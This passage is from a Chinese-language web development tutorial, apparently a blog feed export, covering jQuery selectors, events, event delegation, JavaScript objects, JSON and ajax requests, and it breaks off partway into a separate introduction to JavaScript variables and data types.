jQuery的优点</h3><ul><li>jQuery兼容了现在主流的浏览器，增加了程序员的开发效率。</li><li>jQuery简化了 JavaScript 编程，代码编写更加简单。</li></ul><h2 id="二、jQuery的用法"><a href="#二、jQuery的用法" class="headerlink" title="二、jQuery的用法"></a>二、jQuery的用法</h2><h3 id="1-jQuery的引入"><a href="#1-jQuery的引入" class="headerlink" title="1. jQuery的引入"></a>1. jQuery的引入</h3><pre><code class="js">&lt;script src=&quot;js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;</code></pre><p>jQuery入口函数有两种写法:</p><pre><code class="js">  // 完整写法  $(document).ready(function(){       ...  });  // 简化写法  $(function(){       ...  });</code></pre><h3 id="2-jQuery的入口函数"><a href="#2-jQuery的入口函数" class="headerlink" title="2. jQuery的入口函数"></a>2. jQuery的入口函数</h3><p>我们知道使用js获取标签元素，需要页面加载完成以后再获取，我们通过给onload事件属性设置了一个函数来获取标签元素，而jquery提供了<strong>ready函数</strong>来解决这个问题，保证获取标签元素没有问题，<strong>它的速度比原生的 window.onload 更快</strong>。</p><p><strong>入口函数示例代码:</strong></p><pre><code class="js">&lt;script src=&quot;js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;    window.onload = function(){        var oDiv = document.getElementById(&#39;div01&#39;);        alert(&#39;原生就是获取的div：&#39; + oDiv);    };    $(document).ready(function(){        var $div = $(&#39;#div01&#39;);        alert(&#39;jquery获取的div：&#39; + $div);    });&lt;/script&gt;&lt;div id=&quot;div01&quot;&gt;这是一个div&lt;/div&gt;</code></pre><p><strong>入口函数的简写示例代码:</strong></p><pre><code class="js">&lt;script src=&quot;js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;    window.onload = function(){        var oDiv = document.getElementById(&#39;div01&#39;);        alert(&#39;原生就是获取的div：&#39; + oDiv);    };    /*    $(document).ready(function(){        var $div = $(&#39;#div01&#39;);        alert(&#39;jquery获取的div：&#39; + $div);    });    */    // 上面ready的写法可以简写成下面的形式：    $(function(){        var $div = $(&#39;#div01&#39;);        alert(&#39;jquery获取的div：&#39; + $div);    }); &lt;/script&gt;&lt;div id=&quot;div01&quot;&gt;这是一个div&lt;/div&gt;</code></pre><h2 id="三、jQuery选择器"><a href="#三、jQuery选择器" class="headerlink" title="三、jQuery选择器"></a>三、jQuery选择器</h2><h3 id="1-jQuery选择器的介绍"><a href="#1-jQuery选择器的介绍" class="headerlink" title="1. jQuery选择器的介绍"></a>1. jQuery选择器的介绍</h3><p>jquery选择器就是快速选择标签元素，获取标签的，选择规则和css样式一样。</p><p>jquery给标签设置样式使用css方法</p><h3 id="2-jQuery选择器的种类"><a href="#2-jQuery选择器的种类" class="headerlink" title="2. jQuery选择器的种类"></a>2. jQuery选择器的种类</h3><ol><li>标签选择器</li><li>类选择器</li><li>id选择器</li><li>层级选择器</li><li>属性选择器</li></ol><ul><li>jQuery选择器就是选择标签的</li><li>标签选择器是<strong>根据标签名来选择标签</strong></li><li>类选择器是<strong>根据类名来选择标签</strong></li><li>id选择器是<strong>根据id来选择标签</strong></li><li>层级选择器是<strong>根据层级关系来选择标签</strong></li><li>属性选择器是<strong>根据属性名来选择标签</strong></li></ul><p><strong>示例代码:</strong></p><pre><code class="js">$(&#39;#myId&#39;) //选择id为myId的标签$(&#39;.myClass&#39;) // 选择class为myClass的标签$(&#39;li&#39;) //选择所有的li标签$(&#39;#ul1 li span&#39;) //选择id为ul1标签下的所有li标签下的span标签$(&#39;input[name=first]&#39;) // 选择name属性等于first的input标签</code></pre><p><strong>说明:</strong><br>可以使用length属性来判断标签是否选择成功, 如果length大于0表示选择成功，否则选择失败。</p><pre><code class="js">$(function(){    result = $(&quot;div&quot;).length;    alert(result);});</code></pre><h2 id="四、选择集过滤"><a href="#四、选择集过滤" class="headerlink" title="四、选择集过滤"></a>四、选择集过滤</h2><h3 id="1-选择集过滤的介绍"><a href="#1-选择集过滤的介绍" class="headerlink" title="1. 选择集过滤的介绍"></a>1. 选择集过滤的介绍</h3><p>选择集过滤就是在选择标签的集合里面过滤自己需要的标签</p><ul><li>选择集过滤可以使用has方法和eq方法来完成</li></ul><h3 id="2-选择集过滤的操作"><a href="#2-选择集过滤的操作" class="headerlink" title="2. 选择集过滤的操作"></a>2. 选择集过滤的操作</h3><ul><li>has(选择器名称)方法，表示选取包含指定选择器的标签</li><li>eq(索引)方法，表示选取指定索引的标签</li></ul><p><strong>has方法的示例代码:</strong></p><pre><code class="js">&lt;script&gt;    $(function(){        //  has方法的使用        var $div = $(&quot;div&quot;).has(&quot;#mytext&quot;);        //  设置样式        $div.css({&quot;background&quot;:&quot;red&quot;});    });&lt;/script&gt;&lt;div&gt;    这是第一个div    &lt;input type=&quot;text&quot; id=&quot;mytext&quot;&gt;&lt;/div&gt;&lt;div&gt;    这是第二个div    &lt;input type=&quot;text&quot;&gt;    &lt;input type=&quot;button&quot;&gt;&lt;/div&gt;</code></pre><p><strong>eq方法的示例代码:</strong></p><pre><code class="js">&lt;script&gt;    $(function(){        //  has方法的使用        var $div = $(&quot;div&quot;).has(&quot;#mytext&quot;);        //  设置样式        $div.css({&quot;background&quot;:&quot;red&quot;});        //  eq方法的使用        var $div = $(&quot;div&quot;).eq(1);        //  设置样式        $div.css({&quot;background&quot;:&quot;yellow&quot;});    });&lt;/script&gt;&lt;div&gt;    这是第一个div    &lt;input type=&quot;text&quot; id=&quot;mytext&quot;&gt;&lt;/div&gt;&lt;div&gt;    这是第二个div    &lt;input type=&quot;text&quot;&gt;    &lt;input type=&quot;button&quot;&gt;&lt;/div&gt;</code></pre><h2 id="五、选择集转移"><a href="#五、选择集转移" class="headerlink" title="五、选择集转移"></a>五、选择集转移</h2><h3 id="1-选择集转移介绍"><a href="#1-选择集转移介绍" class="headerlink" title="1. 选择集转移介绍"></a>1. 选择集转移介绍</h3><p>选择集转移就是以选择的标签为参照，然后获取转移后的标签</p><ul><li>prev() 表示获取上一个同级元素</li><li>prevAll() 表示获取上面所有同级元素</li><li>next() 表示获取下一个同级元素</li><li>nextAll() 表示获取下面所有同级元素</li><li>parent() 表示获取父元素</li><li>children() 表示获取所有的子元素</li><li>siblings() 表示获取其它同级元素</li><li>find(“选择器名称”) 表示获取指定选择器的元素</li></ul><h3 id="2-选择集转移操作"><a href="#2-选择集转移操作" class="headerlink" title="2. 选择集转移操作"></a>2. 选择集转移操作</h3><ul><li>$(‘#box’).prev(); 表示选择id是box元素的上一个的同级元素</li><li>$(‘#box’).prevAll(); 表示选择id是box元素的上面所有的同级元素</li><li>$(‘#box’).next(); 表示选择id是box元素的下一个的同级元素</li><li>$(‘#box’).nextAll(); 表示选择id是box元素的下面所有的同级元素</li><li>$(‘#box’).parent(); 表示选择id是box元素的父元素</li><li>$(‘#box’).children(); 表示选择id是box元素的所有子元素</li><li>$(‘#box’).siblings(); 表示选择id是box元素的其它同级元素</li><li>$(‘#box’).find(‘.myClass’); 表示选择id是box元素的class等于myClass的元素</li></ul><p><strong>选择集转移的示例代码:</strong></p><pre><code class="js">&lt;script&gt;    $(function(){        var $div = $(&#39;#div01&#39;);        $div.prev().css({&#39;color&#39;:&#39;red&#39;});        $div.prevAll().css({&#39;text-indent&#39;:50});        $div.next().css({&#39;color&#39;:&#39;blue&#39;});        $div.nextAll().css({&#39;text-indent&#39;:80});        $div.siblings().css({&#39;text-decoration&#39;:&#39;underline&#39;})        $div.parent().css({&#39;background&#39;:&#39;gray&#39;});        $div.children().css({&#39;color&#39;:&#39;red&#39;});        $div.find(&#39;.sp02&#39;).css({&#39;font-size&#39;:30});    });  &lt;/script&gt;&lt;div&gt;    &lt;h2&gt;这是第一个h2标签&lt;/h2&gt;    &lt;p&gt;这是第一个段落&lt;/p&gt;    &lt;div id=&quot;div01&quot;&gt;这是一个&lt;span&gt;div&lt;/span&gt;&lt;span class=&quot;sp02&quot;&gt;第二个span&lt;/span&gt;&lt;/div&gt;    &lt;h2&gt;这是第二个h2标签&lt;/h2&gt;    &lt;p&gt;这是第二个段落&lt;/p&gt;</code></pre><h2 id="六、获取和设置元素内容"><a href="#六、获取和设置元素内容" class="headerlink" title="六、获取和设置元素内容"></a>六、获取和设置元素内容</h2><h3 id="1-html方法的使用"><a href="#1-html方法的使用" class="headerlink" title="1. html方法的使用"></a>1. html方法的使用</h3><ul><li><p>获取和设置元素的内容使用: html方法</p></li><li><p>给指定元素追加html内容使用: append方法</p></li></ul><p>jquery中的html方法可以获取和设置标签的html内容</p><p><strong>示例代码:</strong></p><pre><code class="js">&lt;script&gt;    $(function(){        var $div = $(&quot;#div1&quot;);        //  获取标签的html内容        var result = $div.html();        alert(result);        //  设置标签的html内容，之前的内容会清除        $div.html(&quot;&lt;span style=&#39;color:red&#39;&gt;你好&lt;/span&gt;&quot;);        //  追加html内容        $div.append(&quot;&lt;span style=&#39;color:red&#39;&gt;你好&lt;/span&gt;&quot;);    });&lt;/script&gt;&lt;div id=&quot;div1&quot;&gt;    &lt;p&gt;hello&lt;/p&gt;&lt;/div&gt;</code></pre><p><strong>说明:</strong></p><p>给指定标签追加html内容使用<strong>append方法</strong></p><h2 id="七、获取和设置元素属性"><a href="#七、获取和设置元素属性" class="headerlink" title="七、获取和设置元素属性"></a>七、获取和设置元素属性</h2><h3 id="1-prop方法的使用"><a href="#1-prop方法的使用" class="headerlink" title="1. prop方法的使用"></a>1. prop方法的使用</h3><p>之前使用css方法可以给标签设置样式属性，那么设置标签的其它属性可以使用prop方法了。</p><ul><li>获取和设置元素属性的操作可以通过prop方法来完成</li><li>获取和设置元素的value属性可以通过val方法来完成，更加简单和方便</li></ul><p><strong>示例代码:</strong></p><pre><code class="js">&lt;style&gt;    .a01{        color:red;    }&lt;/style&gt;&lt;script&gt;    $(function(){        var $a = $(&quot;#link01&quot;);        var $input = $(&#39;#input01&#39;)        // 获取元素属性        var sId = $a.prop(&quot;id&quot;);        alert(sId);        // 设置元素属性        $a.prop({&quot;href&quot;:&quot;http://www.baidu.com&quot;,&quot;title&quot;:&#39;这是去到百度的链接&#39;,&quot;class&quot;:&quot;a01&quot;});        //  获取value属性        // var sValue = $input.prop(&quot;value&quot;);        // alert(sValue);        // 获取value属性使用val()方法的简写方式        var sValue = $input.val();        alert(sValue);        // 设置value值        $input.val(&quot;222222&quot;);    })&lt;/script&gt;&lt;a id=&quot;link01&quot;&gt;这是一个链接&lt;/a&gt;&lt;input type=&quot;text&quot; id=&quot;input01&quot; value=&quot;111111&quot;&gt;</code></pre><p><strong>说明:</strong> 获取value属性和设置value属性还可以通过<strong>val方法</strong>来完成。</p><h2 id="八、jQuery事件"><a href="#八、jQuery事件" class="headerlink" title="八、jQuery事件"></a>八、jQuery事件</h2><h3 id="1-常用事件"><a href="#1-常用事件" class="headerlink" title="1. 常用事件"></a>1. 常用事件</h3><ul><li>click() 鼠标单击</li><li>blur() 元素失去焦点</li><li>focus() 元素获得焦点</li><li>mouseover() 鼠标进入（进入子元素也触发）</li><li>mouseout() 鼠标离开（离开子元素也触发）</li><li>ready() DOM加载完成</li></ul><p><strong>示例代码:</strong></p><pre><code class="js">&lt;script&gt;    $(function(){        var $li = $(&#39;.list li&#39;);        var $button = $(&#39;#button1&#39;)        var $text = $(&quot;#text1&quot;);        var $div = $(&quot;#div1&quot;)        //  鼠标点击        $li.click(function(){                         // this指的是当前发生事件的对象，但是它是一个原生js对象            // this.style.background = &#39;red&#39;;            // $(this) 指的是当前发生事件的jquery对象            $(this).css({&#39;background&#39;:&#39;gold&#39;});            // 获取jquery对象的索引值,通过index() 方法            alert($(this).index());        });        //  一般和按钮配合使用        $button.click(function(){            alert($text.val());        });        //  获取焦点        $text.focus(function(){            $(this).css({&#39;background&#39;:&#39;red&#39;});        });        //  失去焦点        $text.blur(function(){            $(this).css({&#39;background&#39;:&#39;white&#39;});        });        //  鼠标进入        $div.mouseover(function(){            $(this).css({&#39;background&#39;:&#39;gold&#39;});        });        //  鼠标离开        $div.mouseout(function() {            $(this).css({&#39;background&#39;:&#39;white&#39;});        });    });&lt;/script&gt;&lt;div id=&quot;div1&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;        &lt;li&gt;列表文字&lt;/li&gt;        &lt;li&gt;列表文字&lt;/li&gt;        &lt;li&gt;列表文字&lt;/li&gt;    &lt;/ul&gt;    &lt;input type=&quot;text&quot; id=&quot;text1&quot;&gt;    &lt;input type=&quot;button&quot; id=&quot;button1&quot; value=&quot;点击&quot;&gt;&lt;/div&gt;</code></pre><p><strong>说明:</strong></p><ul><li>this指的是当前发生事件的对象，但是它是一个原生js对象</li><li>$(this) 指的是当前发生事件的jquery对象</li></ul><h2 id="九、事件代理"><a href="#九、事件代理" class="headerlink" title="九、事件代理"></a>九、事件代理</h2><h3 id="1-事件代理介绍"><a href="#1-事件代理介绍" class="headerlink" title="1. 事件代理介绍"></a>1. 事件代理介绍</h3><p>事件代理就是利用事件冒泡的原理(事件冒泡就是事件会向它的父级一级一级传递),把事件加到父级上，通过判断事件来源，执行相应的子元素的操作，<strong>事件代理首先可以极大减少事件绑定次数，提高性能；其次可以让新加入的子元素也可以拥有相同的操作</strong>。</p><ul><li>事件代理就是使用父元素来代理子元素的事件，好处是减少事件的绑定次数，提高性能。</li><li>使用场景当多个相同的子元素绑定同一个事件，可以使用事件代理。</li><li>事件代理使用是使用delegate方法来完成</li></ul><p><strong>事件冒泡代码:</strong></p><pre><code class="js"> &lt;script&gt;    $(function(){        var $div1 = $(&#39;#div1&#39;);        var $div2 = $(&#39;#div2&#39;);        $div1.click(function(){            alert($(this).html());        });         $div2.click(function(){            alert($(this).html());        });     });&lt;/script&gt; &lt;div id=&quot;div1&quot; style=&quot;width:200px; height:200px; background: red;&quot;&gt;    &lt;div id=&quot;div2&quot; style=&quot;width:100px; height:100px;background: yellow;&quot;&gt;        哈哈    &lt;/div&gt;&lt;/div&gt;</code></pre><p><strong>说明:</strong></p><p>当点击子元素div，它的点击事件会向它父元素传递，也会触发了父元素的点击事件，这就是事件冒泡。</p><h3 id="2-事件代理的使用"><a href="#2-事件代理的使用" class="headerlink" title="2. 事件代理的使用"></a>2. 事件代理的使用</h3><p><strong>一般绑定事件的写法:</strong></p><pre><code class="js">$(function(){    $ali = $(&#39;#list li&#39;);    $ali.click(function() {        $(this).css({background:&#39;red&#39;});    });})&lt;ul id=&quot;list&quot;&gt;    &lt;li&gt;1&lt;/li&gt;    &lt;li&gt;2&lt;/li&gt;    &lt;li&gt;3&lt;/li&gt;    &lt;li&gt;4&lt;/li&gt;    &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;</code></pre><p><strong>事件代理的写法</strong></p><pre><code class="js">$(function(){    $list = $(&#39;#list&#39;);    // 父元素ul 来代理 子元素li的点击事件    $list.delegate(&#39;li&#39;, &#39;click&#39;, function() {        // $(this)表示当前点击的子元素对象        $(this).css({background:&#39;red&#39;});    });})&lt;ul id=&quot;list&quot;&gt;    &lt;li&gt;1&lt;/li&gt;    &lt;li&gt;2&lt;/li&gt;    &lt;li&gt;3&lt;/li&gt;    &lt;li&gt;4&lt;/li&gt;    &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;</code></pre><p><strong>delegate方法参数说明:</strong></p><p>delegate(childSelector,event,function)</p><ul><li>childSelector: 子元素的选择器</li><li>event: 事件名称，比如: ‘click’</li><li>function: 当事件触发执行的函数</li></ul><h2 id="十、JavaScript对象"><a href="#十、JavaScript对象" class="headerlink" title="十、JavaScript对象"></a>十、JavaScript对象</h2><h3 id="1-JavaScript对象的介绍"><a href="#1-JavaScript对象的介绍" class="headerlink" title="1. JavaScript对象的介绍"></a>1. JavaScript对象的介绍</h3><p>JavaScript 中的所有事物都是对象：字符串、数值、数组、函数等都可以认为是对象，此外，JavaScript 允许自定义对象，对象可以拥有属性和方法。</p><p>创建自定义javascript对象有两种方式:</p><ul><li>Object</li><li>字面量</li></ul><h3 id="2-JavaScript创建对象操作"><a href="#2-JavaScript创建对象操作" class="headerlink" title="2. JavaScript创建对象操作"></a>2. JavaScript创建对象操作</h3><p>创建自定义javascript对象有两种方式:</p><ul><li>通过顶级Object类型来实例化一个对象</li><li>通过对象字面量创建一个对象</li></ul><p><strong>Object类创建对象的示例代码:</strong></p><pre><code class="js">&lt;script&gt;    var person = new Object();    // 添加属性：    person.name = &#39;tom&#39;;    person.age = &#39;25&#39;;    // 添加方法：    person.sayName = function(){        alert(this.name);    }    // 调用属性和方法：    alert(person.age);    person.sayName();&lt;/script&gt;</code></pre><p><strong>对象字面量创建对象的示例代码:</strong></p><pre><code class="js">&lt;script&gt;    var person2 = {        name:&#39;Rose&#39;,        age: 18,        sayName:function(){            alert(&#39;My name is&#39; + this.name);        }    }    // 调用属性和方法：    alert(person2.age);    person2.sayName();&lt;/script&gt;</code></pre><p><strong>说明:</strong></p><p>调用属性和方法的操作都是通过点语法的方式来完成，对象的创建推荐使用字面量方式，因为更加简单。</p><h2 id="十一、json"><a href="#十一、json" class="headerlink" title="十一、json"></a>十一、json</h2><h3 id="1-json的介绍"><a href="#1-json的介绍" class="headerlink" title="1. json的介绍"></a>1. json的介绍</h3><p>json是 JavaScript Object Notation 的首字母缩写，翻译过来就是javascript对象表示法，这里说的json就是<strong>类似于javascript对象的字符串</strong>，它同时是一种<strong>数据格式</strong>，目前这种数据格式比较流行，逐渐替换掉了传统的xml数据格式。</p><ul><li>json就是一个javascript对象表示法，json本质上是一个字符串。</li><li>json有两种格式：1. 对象格式, 2. 数组格式</li></ul><h3 id="2-json的格式"><a href="#2-json的格式" class="headerlink" title="2. json的格式"></a>2. json的格式</h3><p>json有两种格式：</p><ol><li>对象格式</li><li>数组格式</li></ol><p><strong>对象格式:</strong></p><p>对象格式的json数据，使用一对大括号({})，大括号里面放入key:value形式的键值对，多个键值对使用逗号分隔。</p><p><strong>对象格式的json数据:</strong></p><pre><code class="json">{    &quot;name&quot;:&quot;tom&quot;,    &quot;age&quot;:18}</code></pre><p><strong>格式说明:</strong></p><p>json中的(key)属性名称和字符串值需要用<strong>双引号</strong>引起来，用单引号或者不用引号会导致读取数据错误。</p><p><strong>数组格式:</strong></p><p>数组格式的json数据，使用一对中括号([])，中括号里面的数据使用逗号分隔。</p><p><strong>数组格式的json数据:</strong></p><pre><code class="json">[&quot;tom&quot;,18,&quot;programmer&quot;]</code></pre><p><strong>实际开发的json格式比较复杂,例如:</strong></p><pre><code class="json">{    &quot;name&quot;:&quot;jack&quot;,    &quot;age&quot;:29,    &quot;hobby&quot;:[&quot;reading&quot;,&quot;travel&quot;,&quot;photography&quot;]    &quot;school&quot;:{        &quot;name&quot;:&quot;Merrimack College&quot;,        &quot;location&quot;:&quot;North Andover, MA&quot;    }}</code></pre><h3 id="3-json数据转换成JavaScript对象"><a href="#3-json数据转换成JavaScript对象" class="headerlink" title="3. json数据转换成JavaScript对象"></a>3. json数据转换成JavaScript对象</h3><p><strong>json本质上是字符串</strong>，如果在js中操作json数据，可以将json字符串转化为JavaScript对象。</p><p><strong>示例代码:</strong></p><pre><code class="json">var sJson = &#39;{&quot;name&quot;:&quot;tom&quot;,&quot;age&quot;:18}&#39;;var oPerson = JSON.parse(sJson);// 操作属性alert(oPerson.name);alert(oPerson.age);</code></pre><h2 id="十二、ajax"><a href="#十二、ajax" class="headerlink" title="十二、ajax"></a>十二、ajax</h2><h3 id="1-ajax的介绍"><a href="#1-ajax的介绍" class="headerlink" title="1. ajax的介绍"></a>1. ajax的介绍</h3><p>ajax 是 Asynchronous JavaScript and XML的简写，ajax一个前后台配合的技术，它可以<strong>让 javascript 发送异步的 http 请求，与后台通信进行数据的获取</strong>，ajax 最大的优点是<strong>实现局部刷新</strong>，ajax可以发送http请求，当获取到后台数据的时候更新页面显示数据实现局部刷新，在这里大家只需要记住，<strong>当前端页面想和后台服务器进行数据交互就可以使用ajax了。</strong></p><p>这里提示一下大家, <strong>在html页面使用ajax需要在web服务器环境下运行, 一般向自己的web服务器发送ajax请求。</strong></p><ul><li>ajax 是发送http请求获取后台服务器数据的技术</li><li>ajax的简写方式可以使用$.get和$.post方法来完成</li></ul><h3 id="2-ajax的使用"><a href="#2-ajax的使用" class="headerlink" title="2. ajax的使用"></a>2. ajax的使用</h3><p>jquery将它封装成了一个方法$.ajax()，我们可以直接用这个方法来执行ajax请求。</p><p><strong>示例代码:</strong></p><pre><code class="js">&lt;script&gt;    $.ajax({    // 1.url 请求地址    url:&#39;http://t.weather.sojson.com/api/weather/city/101010100&#39;,    // 2.type 请求方式，默认是&#39;GET&#39;，常用的还有&#39;POST&#39;    type:&#39;GET&#39;,    // 3.dataType 设置返回的数据格式，常用的是&#39;json&#39;格式    dataType:&#39;JSON&#39;,    // 4.data 设置发送给服务器的数据, 没有参数不需要设置    // 5.success 设置请求成功后的回调函数    success:function (response) {        console.log(response);        },    // 6.error 设置请求失败后的回调函数    error:function () {        alert(&quot;请求失败,请稍后再试!&quot;);    },    // 7.async 设置是否异步，默认值是&#39;true&#39;，表示异步，一般不用写    async:true});&lt;/script&gt;</code></pre><p><strong>ajax方法的参数说明:</strong></p><ol><li>url 请求地址</li><li>type 请求方式，默认是’GET’，常用的还有’POST’</li><li>dataType 设置返回的数据格式，常用的是’json’格式</li><li>data 设置发送给服务器的数据，没有参数不需要设置</li><li>success 设置请求成功后的回调函数</li><li>error 设置请求失败后的回调函数</li><li>async 设置是否异步，默认值是’true’，表示异步，一般不用写</li><li>同步和异步说明<ul><li>同步是一个ajax请求完成另外一个才可以请求，需要等待上一个ajax请求完成，好比线程同步。</li><li>异步是多个ajax同时请求，不需要等待其它ajax请求完成， 好比线程异步。</li></ul></li></ol><p><strong>ajax的简写方式:</strong></p><p>$.ajax按照请求方式可以简写成$.get或者$.post方式</p><p><strong>ajax简写方式的示例代码:</strong></p><pre><code class="js"> &lt;script&gt;    $(function(){        /*         1. url 请求地址         2. data 设置发送给服务器的数据, 没有参数不需要设置         3. success 设置请求成功后的回调函数         4. dataType 设置返回的数据格式，常用的是&#39;json&#39;格式, 默认智能判断数据格式        */         $.get(&quot;http://t.weather.sojson.com/api/weather/city/101010100&quot;, function(dat,status){            console.log(dat);            console.log(status);            alert(dat);        }).error(function(){            alert(&quot;网络异常&quot;);        });        /*         1. url 请求地址         2. data 设置发送给服务器的数据, 没有参数不需要设置         3. success 设置请求成功后的回调函数         4. dataType 设置返回的数据格式，常用的是&#39;json&#39;格式, 默认智能判断数据格式        */         $.post(&quot;test.php&quot;, {&quot;func&quot;: &quot;getNameAndTime&quot;}, function(data){            alert(data.name);             console.log(data.time);         }, &quot;json&quot;).error(function(){            alert(&quot;网络异常&quot;);        });     });&lt;/script&gt;</code></pre><p><strong>$.get和$.post方法的参数说明:</strong></p><p>$.get(url,data,success(data, status, xhr),dataType).error(func)<br>$.post(url,data,success(data, status, xhr),dataType).error(func)</p><ol><li>url 请求地址</li><li>data 设置发送给服务器的数据，没有参数不需要设置</li><li>success 设置请求成功后的回调函数<ul><li>data 请求的结果数据</li><li>status 请求的状态信息, 比如: “success”</li><li>xhr 底层发送http请求XMLHttpRequest对象</li></ul></li><li>dataType 设置返回的数据格式<ul><li>“xml”</li><li>“html”</li><li>“text”</li><li>“json”</li></ul></li><li>error 表示错误异常处理<ul><li>func 错误异常回调函数</li></ul></li></ol><h2 id="十三、Ajax-综合练习"><a href="#十三、Ajax-综合练习" class="headerlink" title="十三、Ajax 综合练习"></a>十三、Ajax 综合练习</h2><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;script src=&quot;js/jquery-3.5.1.min.js&quot;&gt;&lt;/script&gt;    &lt;script&gt;        function search(){            var search_str = $(&quot;input01&quot;).val();            $.get(&quot;http://ttapi.research.itcast.cn/app/v1_0/search?q=&quot; + search_str,function(response){                console.log(typeof(response),response);                var res_array = response.data.results;                var $ul = $(&quot;#content&quot;);                $ul.html(&quot;&quot;);                for(var i=0;i &lt; res_array.length;i++){                    console.log(res_array[i].title);                    $ul.append(&quot;&lt;li&gt;&quot; + res_array[i].title + &quot;&lt;/li&gt;&quot;);                }            },&quot;JSON&quot;).error(function(){                alert(&quot;请求失败，请稍后再试&quot;)            });        }    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;input type=&quot;text&quot; id=&quot;input01&quot;&gt;    &lt;input type=&quot;button&quot; id=&quot;btn01&quot; value=&quot;搜索&quot; onclick=&quot;search();&quot;&gt;    &lt;ul id=&quot;content&quot;&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级06-JavaScript</title>
      <link href="/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A706-JavaScript/"/>
      <url>/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A706-JavaScript/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="一、JavaScript的介绍"><a href="#一、JavaScript的介绍" class="headerlink" title="一、JavaScript的介绍"></a>一、JavaScript的介绍</h2><h3 id="1-JavaScript的定义"><a href="#1-JavaScript的定义" class="headerlink" title="1. JavaScript的定义"></a>1. JavaScript的定义</h3><a id="more"></a><p>JavaScript是运行在浏览器端的脚本语言, 是由浏览器解释执行的, 简称js.</p><p>它能够让网页和用户有交互功能, 增加良好的用户体验效果。</p><h4 id="前端开发三大块"><a href="#前端开发三大块" class="headerlink" title="前端开发三大块"></a>前端开发三大块</h4><p>1、HTML：负责网页结构</p><p>2、CSS：负责网页样式</p><p>3、JavaScript：负责网页行为， 比如:网页与用户的交互效果</p><h2 id="二、JavaScript的使用方式"><a href="#二、JavaScript的使用方式" class="headerlink" title="二、JavaScript的使用方式"></a>二、JavaScript的使用方式</h2><h3 id="1-行内式（主要用于事件）"><a href="#1-行内式（主要用于事件）" class="headerlink" title="1. 行内式（主要用于事件）"></a>1. 行内式（主要用于事件）</h3><pre><code class="html">&lt;input type=&quot;button&quot; name=&quot;&quot; onclick=&quot;alert(&#39;ok！&#39;);&quot;&gt;</code></pre><h3 id="2-内嵌式"><a href="#2-内嵌式" class="headerlink" title="2. 内嵌式"></a>2. 内嵌式</h3><pre><code class="html">&lt;script type=&quot;text/javascript&quot;&gt;            alert(&#39;ok！&#39;);&lt;/script&gt;</code></pre><h3 id="3-外链式"><a href="#3-外链式" class="headerlink" title="3. 外链式"></a>3. 外链式</h3><pre><code class="html">&lt;script type=&quot;text/javascript&quot; src=&quot;js/index.js&quot;&gt;&lt;/script&gt;</code></pre><h2 id="三、变量和数据类型"><a href="#三、变量和数据类型" class="headerlink" title="三、变量和数据类型"></a>三、变量和数据类型</h2><h3 id="1-定义变量"><a href="#1-定义变量" class="headerlink" title="1. 定义变量"></a>1. 定义变量</h3><p>JavaScript 是一种弱类型语言，也就是说不需要指定变量的类型，JavaScript的变量类型由它的值来决定， 定义变量需要用关键字 ‘var’, 一条JavaScript语句应该以“;”结尾</p><p><strong>定义变量的语法格式:</strong></p><p>var 变量名 = 值;</p><pre><code class="javascript"> var iNum = 123; var sTr = &#39;asd&#39;; //同时定义多个变量可以用&quot;,&quot;隔开，公用一个‘var’关键字 var iNum = 45,sTr=&#39;qwe&#39;,sCount=&#39;68&#39;;</code></pre><h3 id="2-JavaScript注释"><a href="#2-JavaScript注释" class="headerlink" title="2. JavaScript注释"></a>2. JavaScript注释</h3><p>JavaScript的注释分为单行注释(//注释内容)和多行注释(/<em>多行注释</em>/)</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot;&gt;    // 单行注释var iNum = 123;/*      多行注释    1、...    2、...*/var sTr = &#39;abc123&#39;;&lt;/script&gt;</code></pre><h3 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3. 数据类型"></a>3. 数据类型</h3><p>js中有六种数据类型，包括五种基本数据类型和一种复杂数据类型(object)。</p><p>5种基本数据类型：<br>1、number 数字类型<br>2、string 字符串类型<br>3、boolean 布尔类型 true 或 false<br>4、undefined undefined类型，变量声明未初始化，它的值就是undefined<br>5、null null类型，表示空对象，如果定义的变量将来准备保存对象，可以将变量初始化为null,在页面上获取不到对象，返回的值就是null</p><p>1种复合类型：<br>1、object 后面学习的<strong>JavaScript对象</strong>属于复合类型</p><p>js中有六种数据类型，分别是:</p><ul><li>number</li><li>string</li><li>boolean</li><li>undefined</li><li>null</li><li>object</li></ul><pre><code class="js">//1.1 数字 numbervar iOne = 10.1;//1.2 字符串 stringvar sStr = &#39;1234&#39;;//1.3 布尔 boolean; var bIsTrue = false;//1.4 未定义 undefinedvar unData;//1.5 null 表示空对象var nullData = null;//1.6 object 表示对象类型var oObj = {   name:&quot;隔壁老王&quot;,   age:88}// 获取变量的类型var type = typeof(oObj);alert(type);// 获取对象的name属性alert(oObj.name);</code></pre><h3 id="4-变量命名规范"><a href="#4-变量命名规范" class="headerlink" title="4. 变量命名规范"></a>4. 变量命名规范</h3><p>1、区分大小写<br>2、第一个字符必须是字母、下划线（_）或者美元符号（$）<br>3、其他字符可以是字母、下划线、美元符或数字</p><h3 id="5-匈牙利命名风格"><a href="#5-匈牙利命名风格" class="headerlink" title="5. 匈牙利命名风格"></a>5. 匈牙利命名风格</h3><p>对象o Object 比如：oDiv<br>数组a Array 比如：aItems<br>字符串s String 比如：sUserName<br>整数i Integer 比如：iItemCount<br>布尔值b Boolean 比如：bIsComplete<br>浮点数f Float 